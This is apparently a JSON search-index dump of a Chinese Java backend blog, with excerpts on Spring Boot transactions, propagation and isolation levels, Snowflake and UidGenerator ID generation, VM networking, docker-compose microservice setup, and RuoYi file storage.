DAO是SUN公司的一个标准J2EE设计模式，这个模式中有个接口就是 DAO，负责持久层的操作并为业务层提供接口。此对象用于访问数据库。通常和PO结合使用。 DAO中包含了各种数据库的操作方法。通过它的方法结合PO对数据库进行CRUD的操作。 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:6","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"POJO（Plain Ordinary Java Object - 简单无规则Java对象） POJO表示一个简单Java对象。PO、VO、DTO都是典型的POJO。 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:7","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"无事务代码 @Override public int add(User user) { user.setId(idGenerator.nextId()); int insert = userMapper.insert(user); int i = 1/0; int insert1 = numMapper.insert(user); return insert; } 一个事务有两个数据库操作来完成，但是当第一个操作完成之后，系统发生了异常，就会造成数据不一致。 如下，两表同步数据，一个表有数据，另一个表没有 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/:0:1","tags":["事务"],"title":"Springboot事务代码实践","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/"},{"categories":["Java后端"],"content":"编程式事务管理 编程式事务管理使用TransactionTemplate或者直接使用底层的PlatformTransactionManager。对于编程式事务管理，spring推荐使用TransactionTemplate。 Service层实现类代码： @Resource TransactionTemplate transactionTemplate; @Override public int add(User user) { final int[] num = {0}; user.setId(idGenerator.nextId()); transactionTemplate.execute(new TransactionCallbackWithoutResult() { @Override protected void doInTransactionWithoutResult(TransactionStatus status) { try { int insert = userMapper.insert(user); num[0] +=insert; // int i = 1/0; int insert1 = numMapper.insert(user); num[0] +=insert1; }catch (Exception e){ status.setRollbackOnly(); } } }); return num[0]; } 另一种实现事务编程方法： import org.springframework.transaction.PlatformTransactionManager; @Resource PlatformTransactionManager transactionManager; public int add(User user) { int num = 0; long l = idGenerator.nextId(); user.setId(l); TransactionStatus status = transactionManager.getTransaction(new DefaultTransactionDefinition()); try { int insert = userMapper.insert(user); //int i = 1/0; int insert1 = numMapper.insert(user); num = insert1; transactionManager.commit(status); }catch (Exception e){ transactionManager.rollback(status); } return num; } 就编程式事务管理而言，Spring 更推荐使用 TransactionTemplate。 TransactionTemplate可以隐式调用commit，不需要在代码中显式调用，只需要事务代码块出现异常时回滚即可 TransactionManager需要显式调用commit和rollback操作；没有commit，数据库不会生成记录。 在编程式事务中，必须在每个业务操作中包含额外的事务管理代码，就导致代码看起来非常的臃肿，但对理解 Spring 的事务管理模型非常有帮助。 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/:0:2","tags":["事务"],"title":"Springboot事务代码实践","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/"},{"categories":["Java后端"],"content":"声明式事务管理 ​ 声明式事务将事务管理代码从业务方法中抽离了出来，以声明式的方式来实现事务管理，对于开发者来说，声明式事务显然比编程式事务更易用、更好用。 ​ 当然了，要想实现事务管理和业务代码的抽离，就必须得用到 Spring 当中的AOP，其本质是对方法前后进行拦截，然后在目标方法开始之前创建或者加入一个事务，执行完目标方法之后根据执行的情况提交或者回滚。 声明式事务虽然优于编程式事务，但也有不足，声明式事务管理的粒度是方法级别，而编程式事务是可以精确到代码块级别的。 REQUIRED 有则加入，内外同步 REQUIRES_NEW 内外分离 NESTED 外影响内，内不影响外 SUPPORTS 有事务就使用，无则非 MANDATORY 有则加入，无则抛异常 NOT_SUPPORTED 非事务，挂起当前事务 NEVER 在事务中抛异常 @Transactional(propagation = Propagation.REQUIRED) public int add(User user) { int num = 0; long l = idGenerator.nextId(); user.setId(l); int insert = userMapper.insert(user); int i = 1/0; int insert1 = numMapper.insert(user); num = insert1; return num; } java.lang.ArithmeticException: / by zero at com.jindong.dailytest.service.impl.UserServiceImpl.add(UserServiceImpl.java:78) ~[classes/:na] 业务代码处在同一个事务中，系统抛出异常后，业务代码都不成功 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/:0:3","tags":["事务"],"title":"Springboot事务代码实践","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/"},{"categories":["Java后端"],"content":"事务是为了解决数据安全问题而存在的。 最经典的例子就是银行转账问题，A账户给B账户转账100元，A账户扣除100元后由于不可抗力因素导致程序中断，B账户没有收到那100元，A账户那100元凭空消失，肯定是不行的。A扣款和B收款操作要么同时成功，要么同时失败，这个时候就需要引入事务操作。 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/:0:1","tags":["事务"],"title":"Springboot事务概述","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/"},{"categories":["Java后端"],"content":"事务的四个特性： 原子性：一个事务是一个不可分割的工作单位。 一致性：事务必须是使数据库从一个一致性状态变到另一个一致性状态，一致性与原子性是密切相关的。 隔离性：一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 持久性：一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/:0:2","tags":["事务"],"title":"Springboot事务概述","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/"},{"categories":["Java后端"],"content":"事务管理方式 spring支持编程式事务管理和声明式事务管理两种方式。 编程式事务管理使用TransactionTemplate或者直接使用底层的PlatformTransactionManager。对于编程式事务管理，spring推荐使用TransactionTemplate。 声明式事务管理建立在AOP之上的。其本质是对方法前后进行拦截，然后在目标方法开始之前创建或者加入一个事务，在执行完目标方法之后根据执行情况提交或者回滚事务。声明式事务最大的优点就是不需要通过编程的方式管理事务，这样就不需要在业务逻辑代码中掺杂事务管理的代码，只需在配置文件中做相关的事务规则声明(或通过基于@Transactional注解的方式)，便可以将事务规则应用到业务逻辑中。 @Transactional注解： 它是声明式事务管理编程中使用的注解，放在接口实现类或接口实现方法上，并且只对public方法才起作用。只读的接口不需要事务管理，防止影响系统性能。 @Transactional 实质是使用了 JDBC 的事务来进行事务控制的，实现原理： 事务开始时，通过AOP机制，生成一个代理connection对象，并将其放入 DataSource 实例的某个与 DataSourceTransactionManager 相关的某处容器中。在接下来的整个事务中，客户代码都应该使用该 connection 连接数据库，执行所有数据库命令。[不使用该 connection 连接数据库执行的数据库命令，在本事务回滚的时候得不到回滚]（物理连接 connection 逻辑上新建一个会话session；DataSource 与 TransactionManager 配置相同的数据源） 事务结束时，回滚在第1步骤中得到的代理 connection 对象上执行的数据库命令，然后关闭该代理 connection 对象。（事务结束后，回滚操作不会对已执行完毕的SQL操作命令起作用） ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/:0:3","tags":["事务"],"title":"Springboot事务概述","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/"},{"categories":["Java后端"],"content":"事务的隔离级别 当多个线程都开启事务操作数据库中的数据时，数据库系统要能进行隔离操作，以保证各个线程获取数据的准确性。隔离级别越高，数据库的并发性能就越差。 第一种隔离级别：Read uncommitted(读未提交) 在该隔离级别下，所有事务都可以看到其它未提交事务的执行结果。即在该级别下，事务的修改即便没有提交，对其他事务也都是可见的，可能出现脏读、不可重复读、幻读。 第二种隔离级别：Read committed(读提交) 该隔离级别满足了隔离的简单定义，一个事务只能看见已经提交事务所做的改变。这是Oracle数据库默认的事务隔离级别。避免了脏读，可能出现不可重复读、幻读。 第三种隔离级别：Repeatable read(可重复读取) 可以确保同一个事务在多次读取同样的数据时，返回同样的结果。这是MySQL数据库默认的事务隔离级别。这样避免了不可重复读和脏读，但是有时可能会出现幻读。 第四种隔离级别：Serializable(可序化) 它通过强制事务排序，使事务一个一个的进行，事务之间不可能再存在相互冲突，从而解决幻读问题。 脏读、不可重复读、幻读： 1、脏读 脏读就是指当A事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，B事务也访问这个数据，然后使用了这个数据。这时候如果事务A回滚，那么B事务读到的数据是不被承认的。 2、不可重复读（重点在修改，体现在值不同） 指在A事务内，多次读同一数据。在A事务还没有结束时，B事务也访问该同一数据。那么，在A事务中的两次读数据之间，由于B事务的修改，那么A事务两次读到的的数据可能是不一样的。这样就发生了在A事务内两次读到的数据是不一样的。 3、幻读（重点在增加或删除，体现在记录数不同） 是指当事务不是独立执行时发生的一种现象，例如A事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，B事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作A事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。 具体可看↓ 数据库事务隔离级别（脏读、幻读、不可重复读）_qq_41776884的博客-CSDN博客_脏读幻读不可重复读 一、脏读、幻读和不可重复读一、脏读、不可重复读、幻读1、脏读：脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。例如：张三的工资为5000,事务A中把他的工资改为8000,但事务A尚未提交。与此同时，事务B正在读取张三的工资，读取到张三的工资为8000。随后，事务A发生异常，而回滚了事务… https://blog.csdn.net/qq_41776884/article/details/81608777 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/:0:4","tags":["事务"],"title":"Springboot事务概述","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/"},{"categories":["Java后端"],"content":"事务的传播行为 事务的传播行为是针对嵌套事务而言的。具体可见↓ 【十六】Spring Boot之事务（事务传播机制、嵌套事务、事务隔离机制详解）_jy02268879的博客-CSDN博客_springboot 事务嵌套 一、事务传播机制：事务的传播行为是针对嵌套事务而言。示例：@Transactional(propagation = Propagation.REQUIRED)2.1.1REQUIREDspring默认的事务传播行为就是它。支持事务。如果业务方法执行时已经在一个事务中，则加入当前事务，否则重新开启一个事务。外层事务提交了，内层才会提交。内/外只要有报错，他俩会一起回滚。… https://blog.csdn.net/jy02268879/article/details/84322459 REQUIRED @Transactional(propagation = Propagation.REQUIRED) spring中的默认事务传播行为就是它。如果业务方法执行时已经在一个事务中，则加入当前事务， 否则重新开启一个事务。外层事务提交了，内层才会提交。内/外只要有报错，他俩会一起回滚。 只要内层方法报错抛出异常，即使外层有try-catch，该事务也会回滚。 因为内外层方法在同一个事务中，内层只要抛出了异常，这个事务就会被设置成rollback-only，即使外层try-catch内层的异常，该事务也会回滚。 REQUIRES_NEW @Transactional(propagation = Propagation.REQUIRES_NEW) 支持事务。每次都是创建一个新事物，如果当前已经在事务中了，会挂起当前事务。内层事务结束，内层就提交了，不用等着外层一起提交。 外层报错回滚，不影响内层。内层报错回滚，外层try-catch内层的异常，外层不会回滚。 内层报错回滚，然后又会抛出异常，外层如果没有捕获处理内层抛出来的这个异常，外层还是会回滚的。 NESTED @Transactional(propagation = Propagation.NESTED) 支持事务。如果当前事务存在，那么在嵌套的事务中执行，内层事务结束，要等着外层一起提交。如果当前事务不存在，则表现跟REQUIRED一样。 这个直接说，如果外层报错回滚，内层也会跟着回滚。 如果只是内层回滚，不影响外层。这个内层回滚不影响外层的特性是有前提的，否则内外都回滚。 内层是NESTED模式下，外层要try-catch内层的异常，外层才不会回滚。而内层是REQUIRED模式的话，即使外层try-catch内层异常，外层同样会回滚的。 SUPPORTS @Transactional(propagation = Propagation.SUPPORTS) 支持事务。当前有事务就支持使用当前事务，若当前不存在事务，以非事务的方式执行。内层事务结束，要等着外层一起提交。 MANDATORY @Transactional(propagation = Propagation.MANDATORY) 支持事务，如果业务方法执行时已经在一个事务中，则加入当前事务。否则抛出异常。内层事务结束，要等着外层一起提交。 NOT_SUPPORTED @Transactional(propagation = Propagation.NOT_SUPPORTED) 不支持事务，以非事务的方式执行，若当前存在事务，则把当前事务挂起，等方法执行完毕后，事务恢复进行。 若A是事务执行，B（NOT_SUPPORTED非事务执行）B在A尚未提交前再操作同一条记录，会产生死锁，A、B不可操作同一条记录。 NEVER @Transactional(propagation = Propagation.NEVER) 不支持事务。如果当前已经在一个事务中了，抛出异常。 ","date":"2022-12-05","objectID":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/:0:5","tags":["事务"],"title":"Springboot事务概述","uri":"/posts/springboot%E4%BA%8B%E5%8A%A1%E6%A6%82%E8%BF%B0/"},{"categories":["java"],"content":"UidGenerator 0概述 UidGenerator是百度开源的Java语言实现，基于Snowflake算法的唯一ID生成器。 它是分布式的，并克服了雪花算法的并发限制。 单个实例的QPS能超过6000000。 需要的环境：JDK8+，MySQL（用于分配WorkerId） 但是百度对这些组成部分稍微调整了一下： 由上图可知，UidGenerator的时间部分只有28位，这就意味着UidGenerator默认只能承受8.5年（2^28-1/86400/365） 也可以根据你业务的需求，UidGenerator可以适当调整delta seconds、worker node id和sequence占用位数。 对于分布式的业务系统来说，SnowFlake算法的优缺点如下。 ► 优点： 1）毫秒数在高位，自增序列在低位，整个ID都是趋势递增的； 2）不依赖数据库等第三方系统，以服务的方式部署，稳定性更高，生成ID的性能也是非常高的； 3）可以根据自身业务特性分配bit位，非常灵活。 ► 缺点： 强依赖机器时钟，如果机器上时钟回拨，会导致发号重复或者服务会处于不可用状态。 UidGenerator改进后的SnowFlake算法 通过上节，我们知道了原版SnowFlake算法的基本构成。 具体是，原版SnowFlake算法核心组成： 原版SnowFlake算法各字段的具体意义是： 1）1位sign标识位； 2）41位时间戳； 3）10位workId（即5位数据中心id+5位工作机器id）； 4）12位自增序列。 而UidGenerator改进后的SnowFlake算法核心组成如下图： 简单来说，UidGenerator能保证“ 指定机器 \u0026 同一时刻 \u0026 某一并发序列 ”，是唯一，并据此生成一个64 bits的唯一ID（long），且默认采用上图字节分配方式。 与原版的snowflake算法不同，UidGenerator还支持自定义时间戳、工作机器id和序列号等各部分的位数，以应用于不同场景（详见源码实现）。 如上图所示，UidGenerator默认ID中各数据位的含义如下： 1）sign(1bit)： 固定1bit符号标识，即生成的UID为正数。 2）delta seconds (28 bits)： 当前时间，相对于时间基点\"2016-05-20\"的增量值，单位：秒，最多可支持约8.7年（注意：(a)这里的单位是秒，而不是毫秒！(b)注意这里的用词，是“最多”可支持8.7年，为什么是“最多”，后面会讲）。 3）worker id (22 bits)： 机器id，最多可支持约420w次机器启动。内置实现为在启动时由数据库分配，默认分配策略为用后即弃，后续可提供复用策略。 4）sequence (13 bits)： 每秒下的并发序列，13 bits可支持每秒8192个并发（注意下这个地方，默认支持qps最大为8192个）。 UidGenerator的具体代码实现分析 通过阅读UidGenerator的源码可知，UidGenerator的具体实现有两种选择，即 DefaultUidGenerator 和 CachedUidGenerator。我们分别来看看这两个具体代码实现的精妙之处。 DefaultUidGenerator DefaultUidGenerator 的源码很清楚的说明了几个生成ID的关键位的实现逻辑。 1）delta seconds（28 bits）： 这个值是指当前时间与epoch时间的时间差，且单位为秒。epoch时间就是指集成DefaultUidGenerator生成分布式ID服务第一次上线的时间，可配置，也一定要根据你的上线时间进行配置，因为默认的epoch时间可是2016-09-20，不配置的话，会浪费好几年的可用时间。 2）worker id（22bits）： 接下来说一下DefaultUidGenerator是如何给worker id赋值的，搭建DefaultUidGenerator的话，需要创建一个表。 3）sequence（13bits）： 核心代码如下，几个实现的关键点： a. synchronized保证线程安全； b. 如果时间有任何的回拨，那么直接抛出异常； c. 如果当前时间和上一次是同一秒时间，那么sequence自增。如果同一秒内自增值超过2^13-1，那么就会自旋等待下一秒（getNextSecond）； d. 如果是新的一秒，那么sequence重新从0开始。 （ 上述源码节选自：DefaultUidGenerator 类中的 nextId 方法） 4）小结： 通过DefaultUidGenerator的实现可知，它对时钟回拨的处理比较简单粗暴。另外如果使用UidGenerator的D","date":"2022-12-03","objectID":"/posts/springboot%E9%9B%86%E6%88%90uidgenerator%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:0:1","tags":["分布式ID","Snowflake","Long精度丢失"],"title":"springboot集成UidGenerator最佳指南","uri":"/posts/springboot%E9%9B%86%E6%88%90uidgenerator%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["Tools"],"content":"虚拟机网络一般配置为net模式 要求：虚拟机网段与客户端网段不需要在同一网段内，所以没什么关系 上截图 ens33: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 12.168.120.3 netmask 255.255.255.0 broadcast 12.168.120.255 inet6 fe80::9e98:31b8:51e:9ffb prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:0c:29:8c:87:3f txqueuelen 1000 (Ethernet) RX packets 113 bytes 15203 (14.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 120 bytes 14794 (14.4 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 1、虚拟机IP：12.168.120.3 网络掩码：255.255.255.0 网关：12.168.120.2 客户端只需要设置VMnet8虚拟网络参数 ","date":"2022-12-02","objectID":"/posts/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/:0:0","tags":["网络","虚拟机"],"title":"虚拟机网络配置","uri":"/posts/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"Docker compose  \u0026  Docker Swarm","date":"2022-11-29","objectID":"/posts/docker%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92tips/","tags":["docker容器编排"],"title":"Docker容器编排TIPS","uri":"/posts/docker%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92tips/"},{"categories":["运维"],"content":" 一个系统采用微服务的方式编写，根据业务分割，将系统分为权限管理，内容管理，订单管理，视频管理，数据统计等服务，每个服务以Docker容器的方式运行，底层的redis,mysql等基础性的组件也以容器的方式启动，所有容器在同一主机的同一网络内，在同一个虚拟网络内，每个服务占用一个接口，因此，各个服务之间是相互可以通信的，在系统运行时只需要开放网关接口，所有请求通过网关转发到具体服务，所以在运行期，所有非网关端口对外不可见，在一定程度上也保证了系统安全。 但是在系统运行时，可能出现系统Bug,此时需要访问一些内部组件或服务来查找原因，但是端口又不可见，停止容器，重新启动容器加端口映射并不是明智之举，解决完问题又需要把端口关闭，此时就需要在系统中加一个nginx; 在网络中加一个或者多个nginx,把需要的端口映射出来，不需要外部访问时把nginx关闭，就做到了端口安全，当需要访问内部服务是，只需要开启有对应端口映射的nginx,就能达到动态开启端口与关闭端口的目的。 docker-compose.xml配置 version: '3' services: service-gateway: image: hubu8023/api_gateway:${TAG} container_name: service-gateway ports: - \"8222:8222\" restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-cms: image: hubu8023/service_cms:${TAG} container_name: service-cms restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-acl: image: hubu8023/service_acl:${TAG} container_name: service-acl restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-edu: image: hubu8023/service_edu:${TAG} container_name: service-edu restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-msm: image: hubu8023/service_msm:${TAG} container_name: service-msm restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-order: image: hubu8023/service_order:${TAG} container_name: service-order restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-oss: image: hubu8023/service_oss:${TAG} container_name: service-oss restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-sta: image: hubu8023/service_sta:${TAG} container_name: service-sta restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service_usercenter: image: hubu8023/service_usercenter:${TAG} container_name: service_usercenter restart: on-failure depends_on: - mysql - nacos - redis env_file: - .env service-vod: image: hubu8023/service_vod:${TAG} container_name: service-vod restart: on-failure env_file: - .env nacos: ","date":"2022-11-29","objectID":"/posts/docker%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92tips/:0:0","tags":["docker容器编排"],"title":"Docker容器编排TIPS","uri":"/posts/docker%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92tips/"},{"categories":["java"],"content":"分布式ID生成算法Snowflake的原理与应用 ","date":"2022-11-29","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/:1:0","tags":["分布式ID","Snowflake","Long精度丢失"],"title":"分布式ID生成算法Snowflake的原理与应用","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/"},{"categories":["java"],"content":"UUID UUID(universally unique identifier) 长度是128 bit，也就是由32个16进制数值组成。其中 M 表示 version，N 表示 Variants xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx。例如：1e92d156-ffd6-4a38-9275-f66c31c31e13 UUID由以下几部分的组合： 当前日期和时间， 时钟序列。 全局唯一的IEEE机器识别号，如果有网卡，从网卡MAC地址获得，没有网卡以其他方式获得。 优点： 本地生成ID，不需要远程调用，时延低，适用于数据量小。 当数据量大的时候，UUID用作数据库主键会存在以下问题： UUID比较长，占用空间大，会间接导致数据库性能下降。 无序。会导致B+树索引在写的时候有过多的随机写操作、叶分裂等问题，导致数据库性能下降。 信息安全。UUID可能包含了MAC地址信息。 ","date":"2022-11-29","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/:1:1","tags":["分布式ID","Snowflake","Long精度丢失"],"title":"分布式ID生成算法Snowflake的原理与应用","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/"},{"categories":["java"],"content":"Snowflake 概述 SnowFlake算法生成id的结果是一个64bit大小的整数，它的结构如下图： 1位，不用。二进制中最高位为1的都是负数，但是我们生成的id一般都使用整数，所以这个最高位固定是0 41位，用来记录时间戳（毫秒）。 41位可以表示2^41−1个数字，如果只用来表示正整数（计算机中正数包含0），可以表示的数值范围是：0 至 2^41−1，减1是因为可表示的数值范围是从0开始算的，而不是1。 也就是说41位可以表示2^41−1个毫秒的值，转化成单位年则是(2^41−1)/(1000∗60∗60∗24∗365)=69年 10位，用来记录工作机器id。 可以部署在2^10=1024个节点，包括5位datacenterId和5位workerId 5位（bit）可以表示的最大正整数是2^5−1=31，即可以用0、1、2、3、….31这32个数字，来表示不同的datecenterId或workerId 12位，序列号，用来记录同毫秒内产生的不同id。 12位（bit）可以表示的最大正整数是2^12−1=4095，即可以用0、1、2、3、….4094这4095个数字，来表示同一机器同一时间截（毫秒)内产生的4095个ID序号 由于在Java中64bit的整数是long类型，所以在Java中SnowFlake算法生成的id就是long来存储的。 作用 SnowFlake可以保证： 所有生成的id按时间趋势递增 整个分布式系统内不会产生重复id（因为有datacenterId和workerId来做区分） java实现 public class SnowFlake { /** * 起始的时间戳:这个时间戳自己随意获取，比如自己代码的时间戳 */ private final static long START_STMP = 1543903501000L; /** * 每一部分占用的位数 */ private final static long SEQUENCE_BIT = 12; //序列号占用的位数 private final static long MACHINE_BIT = 5; //机器标识占用的位数 private final static long DATACENTER_BIT = 5;//数据中心占用的位数 /** * 每一部分的最大值：先进行左移运算，再同-1进行异或运算；异或：相同位置相同结果为0，不同结果为1 */ /** 用位运算计算出最大支持的数据中心数量：31 */ private final static long MAX_DATACENTER_NUM = -1L ^ (-1L \u003c\u003c DATACENTER_BIT); /** 用位运算计算出最大支持的机器数量：31 */ private final static long MAX_MACHINE_NUM = -1L ^ (-1L \u003c\u003c MACHINE_BIT); /** 用位运算计算出12位能存储的最大正整数：4095 */ private final static long MAX_SEQUENCE = -1L ^ (-1L \u003c\u003c SEQUENCE_BIT); /** * 每一部分向左的位移 */ /** 机器标志较序列号的偏移量 */ private final static long MACHINE_LEFT = SEQUENCE_BIT; /** 数据中心较机器标志的偏移量 */ private final static long DATACENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; /** 时间戳较数据中心的偏移量 */ private final static long TIMESTMP_LEFT = DATACENTER_LEFT + DATACENTER_BIT; private static long datacenterId; //数据中心 private static long machineId; //机器标识 private static long sequence = 0L; //序列号 private static long lastStmp = -1L;//上一次时间戳 /** 此处无参构造私有，同时没有给出有参构造，在于避免以下两点问题： 1、私有化避免了通过new的方式进行调用，主要是解决了在for循环中通过new的方式调用产生的id不一定唯一问题问题，因为用于 记录上一次时间戳的lastStmp永远无法得到比对； 2、没有给出有参构造在第一点的基础上考虑了一套分布式系统产生的唯一序列号应该是基于相同的参数 */ private SnowFlake(){} /** * 产生下","date":"2022-11-29","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/:1:2","tags":["分布式ID","Snowflake","Long精度丢失"],"title":"分布式ID生成算法Snowflake的原理与应用","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95snowflake%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/"},{"categories":["Java后端"],"content":"关于分布式文件的思考 ","date":"2022-11-27","objectID":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/:1:0","tags":["分布式文件"],"title":"关于分布式文件的思考","uri":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/"},{"categories":["Java后端"],"content":"谈一谈Ruoy ruoyi框架在实现分布式文件系统时给了用户三种选择：本地存储，minio以及FastDFS。 在具体的使用中，只能指定一种存储方式，不能多源存储，在三种存储方式中，之后后面两种支持分布式系统。 @Primary:意思是在众多相同的bean中，优先使用用@Primary注解的bean。 ​ 在架构上，通过三个不同子类FastDfsSysFileServiceImpl.java、MinioSysFileServiceImpl.java、LocalSysFileServiceImpl.java实现同一个基类ISysFileService.java，默认LocalSysFileServiceImpl.java作为默认存储方式。 ​ 在依赖注入时，只注入默认的文件服务 @RestController public class SysFileController { private static final Logger log = LoggerFactory.getLogger(SysFileController.class); @Autowired private ISysFileService sysFileService; /** * 文件上传请求 */ @PostMapping(\"upload\") public R\u003cSysFile\u003e upload(MultipartFile file) { try { // 上传并返回访问地址 String url = sysFileService.uploadFile(file); SysFile sysFile = new SysFile(); sysFile.setName(FileUtils.getName(url)); sysFile.setUrl(url); return R.ok(sysFile); } catch (Exception e) { log.error(\"上传文件失败\", e); return R.fail(e.getMessage()); } } } 存在的缺点： 1、不能在controller层实现调用不同的文件服务，无法在调用层实现文件服务的切换； 2、切换数据源需要改代码； 3、不能多源存储，实现逻辑为一份文件实现多个数据源同时存储，可以存储在数据库的不同字段，以便系统容错 